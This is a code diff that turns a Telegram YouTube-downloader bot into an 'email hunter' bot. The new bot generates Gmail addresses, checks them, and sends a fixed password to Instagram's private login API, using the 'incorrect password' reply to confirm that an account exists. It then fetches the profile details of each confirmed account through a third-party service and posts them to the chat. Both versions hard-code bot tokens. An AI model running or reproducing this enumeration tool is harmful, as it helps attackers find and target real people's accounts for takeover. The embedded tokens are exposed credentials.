@@ -1,118 +1,97 @@
-import requests,re
-from re import findall
-import telebot
+import requests 
+import telebot 
 from telebot import types
-
-bot = telebot.TeleBot("5339545164:AAGYoWHpe0aEpfWlSnY00dZhCVDqc0i0QYs")
-
-@bot.message_handler(commands=['start'])
+import requests
+from uuid import uuid4
+from gdolib import *
+import gdolib
+from Nova_Tools import Tools
+from TrackCobra import Valid
+uid = uuid4()
+tok ="5420949511:AAEQ3kRnqeOdPgVTsV2QrdhQK0FargrKOOk"
+bot = telebot.TeleBot(tok)
+srt = types.InlineKeyboardButton(text ="- HUNTR",callback_data = 'hun')
+me = types.InlineKeyboardButton(text ="- TeLe ",url="https://t.me/IIlAndylII")
+@bot.message_handler(commands=["start"])
 def start(message):
-    key = types.InlineKeyboardMarkup()
-    key.row_width = 2
-    btn1 = types.InlineKeyboardButton(text=f"- تحميل فيديو .",callback_data="vid")
-    btn2 = types.InlineKeyboardButton(text=f"- تحميل صوت .",callback_data="mp3")
-    btn3 = types.InlineKeyboardButton(text=f"- المبرمق .",url="https://t.me/O_GH0")
-    key.add(btn1,btn2)
-    key.add(btn3)
-    bot.reply_to(message,f"- اهلا بك في بوت تحميل يوتيوب\n- يمكنك التحكم من الاسفل ادناه ..\n- @oyurl .",reply_markup=key)
-@bot.callback_query_handler(func=lambda m:True)
-def qu(call):
-    if call.data == "vid":
-        mm = bot.send_message(call.message.chat.id,f"- قم بأرسال كلمة للبحث عن الفيديو .")
-        bot.register_next_step_handler(mm,downVid)
-    if call.data == "mp3":
-        mm = bot.send_message(call.message.chat.id,f"- قم بأرسال كلمة للبحث عن الفيديو .")
-        bot.register_next_step_handler(mm,downMp3)
-def downVid(message):
-    lii = message.text
-    p = bot.send_message(message.chat.id,f"- يتم البحث الان ..")
-    ul = requests.get(f"https://mr-abood.herokuapp.com/YouTube/Videos/Search?query={lii}&page=1")
-    if "id" in ul.text:
-        id = ul.json()[0]['id']
-        print(id)
-        title = ul.json()[0]['title']
-        dur = ul.json()[0]['duration']
-        vi = ul.json()[0]['viewCount']['short']
-        key2 = types.InlineKeyboardMarkup()
-        key2.row_width = 1
-        btn5 = types.InlineKeyboardButton(text=f"- المبرمق",url=f"https://t.me/O_GH0")
-        key2.add(btn5)
-        rtr = requests.get('https://yoodownload.com/').text
-        token = re.findall('<input name="token" type="hidden" value="(.*?)">',rtr)[0]
-        
-        hheaders = {
-    # trakos headers
-    'authority': 'yoodownload.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # Requests sorts cookies= alphabetically
-    'cookie': '_ga=GA1.2.89962626.1659127863; _gid=GA1.2.21866011.1659127863; _gat=1',
-    'origin': 'https://yoodownload.com',
-    'referer': 'https://yoodownload.com/index.php?error=41',
-    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
-}
-        dataa = {
-    'u': f'https://youtu.be/{id}',
-    'token': f'{token}',
-        }
-
-        response = requests.post('https://yoodownload.com/download.php', headers=hheaders, data=dataa).text
-        lil = (re.findall('href="(.*?)"',response)[20])
-        bot.delete_message(chat_id=message.chat.id,message_id=p.message_id)
-        bot.send_video(message.chat.id,lil,caption=f"- العنوان : {title}\n- المشاهدات : {vi}",reply_markup=key2)
-    else:
-        bot.reply_to(message,f"صار خطأ ..")
-def downMp3(message):
-    lii = message.text
-    p = bot.send_message(message.chat.id,f"- يتم البحث الان ..")
-    ul = requests.get(f"https://mr-abood.herokuapp.com/YouTube/Videos/Search?query={lii}&page=1")
-    if "id" in ul.text:
-        id = ul.json()[0]['id']
-        print(id)
-        title = ul.json()[0]['title']
-        dur = ul.json()[0]['duration']
-        vi = ul.json()[0]['viewCount']['short']
-        key2 = types.InlineKeyboardMarkup()
-        key2.row_width = 1
-        btn5 = types.InlineKeyboardButton(text=f"- المبرمق",url=f"https://t.me/O_GH0")
-        key2.add(btn5)
-        rtr = requests.get('https://yoodownload.com/').text
-        token = re.findall('<input name="token" type="hidden" value="(.*?)">',rtr)[0]
-        
-        headers = {
-    'authority': 'api.onlinevideoconverter.pro',
-    'accept': 'application/json, text/plain, */*',
-    'accept-language': 'en-US,en;q=0.9',
-    # Already added when you pass json=
-    # 'content-type': 'application/json',
-    'origin': 'https://en.onlinevideoconverter.pro',
-    'referer': 'https://en.onlinevideoconverter.pro/',
-    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
-}
-
-        json_data = {
-    'url': f'https://youtu.be/{id}',
-    'converter': 'ffmpeg-mp3',
-}
-
-        response = requests.post('https://api.onlinevideoconverter.pro/api/convert', headers=headers, json=json_data).json()['resource']['taskName']
-        bot.delete_message(chat_id=message.chat.id,message_id=p.message_id)
-        bot.send_voice(message.chat.id,f"https://en.onlinevideoconverter.pro/api/storage/{response}",caption=f"- العنوان : {title}\n- المشاهدات : {vi}",title="FuckOff",reply_markup=key2)
-    else:
-        bot.reply_to(message,f"صار خطأ ..")
-bot.infinity_polling()
+    fr = message.from_user.first_name
+    maac = types.InlineKeyboardMarkup()
+    maac.row_width = 1
+    maac.add(srt,me)
+    bot.send_message(message.chat.id,f"""HELO PRO {fr} TO BOT EMAIL INSTA OR FACEBOOK 
+START EMAIL LITSCO HUNTR""",parse_mode="html",reply_markup=maac)
+@bot.callback_query_handler(func=lambda call: True)
+def qwere(call):
+    if call.data == "hun":
+        li(call.message)
+def li(message):
+    gGod=0
+    bad1=0
+    bad2=0
+    bad3=0
+    Godg=0
+    facedon=0
+    bad=0
+    fr = message.from_user.first_name
+    while True:
+        emaill=gdolib.gdo_drow.get_email()
+        emaile=emaill.split("@")[0]+"@gmail.com"
+        email=emaile
+        user=email.split("@")[0]
+        gmail = Tools.check_email_gmail(email)
+        if str("'The resulting': 'True") in str(gmail):
+            Godg+=1
+            url='https://i.instagram.com/api/v1/accounts/login/'
+            headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
+                 'Cookie':'missing',
+                 'Accept-Encoding':'gzip, deflate',
+                 'Accept-Language':'en-US',
+                 'X-IG-Capabilities':'3brTvw==',
+                 'X-IG-Connection-Type':'WIFI',
+                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
+              'Host':'i.instagram.com'}
+            data = {'uuid':uid,  'password':'@PATREKMOD',
+              'username':email,
+              'device_id':uid,
+              'from_reg':'false',
+              '_csrftoken':'missing',
+              'login_attempt_countn':'0'}
+            req= requests.post(url, headers=headers, data=data).json()
+            if req['message'] == 'The password you entered is incorrect. Please try again.':
+                gGod+=1
+                urd=f"https://mohammed-9.herokuapp.com/?user={user}"
+                red=requests.get(urd).json()
+                name = red["NAME"]
+                followers = red["FOLLOWERS"]
+                private=red["PRIVATE"]
+                id=red["ID"]
+                bio=red["BIO"]
+                posts=red["POSTS"]
+                GDO =(f"""
+⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ ANDY ⌯
+•━━━━━━━━━━━━━━━•
+⌯ ɴᴀᴍᴇ » {name}
+⌯ ᴜsᴇʀɴᴀᴍᴇ » {user}
+⌯ ᴇᴍᴀɪʟ » {email}
+⌯ ғᴏʟʟᴏᴡᴇʀs » {followers}
+⌯ ɪᴅ » {id}
+⌯ ʙɪᴏ » {bio}
+⌯ ᴘᴏsᴛs » {posts}
+⌯ ᴘʀɪvᴀᴛᴇ » {private}
+⌯ 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}
+•━━━━━━━━━━━━━━━•
+◔‌◔ ʙʏ » @IlCoderlI - @IIlAndylII .""")
+                bot.send_message(message.chat.id,GDO)
+            else:
+                bad1+=1
+        else:
+            bad3+=1
+            mees = types.InlineKeyboardMarkup(row_width=1)
+            ba1=types.InlineKeyboardButton(f"Email : {email}",callback_data='b1')
+            ba2=types.InlineKeyboardButton(f"God Insta: {gGod}",callback_data='b2')
+            ba3=types.InlineKeyboardButton(f"God Gmail : {Godg}",callback_data='b3')
+            ba5=types.InlineKeyboardButton(f"BaD Gmail : {bad3}",callback_data='b5')
+            ba6=types.InlineKeyboardButton(f"Bad Insta : {bad1}",callback_data='b6')
+            mees.add(ba1,ba2,ba3,ba5,ba6)
+            bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="START HUNTR ....",parse_mode='markdown',reply_markup=mees) 
+bot.polling()
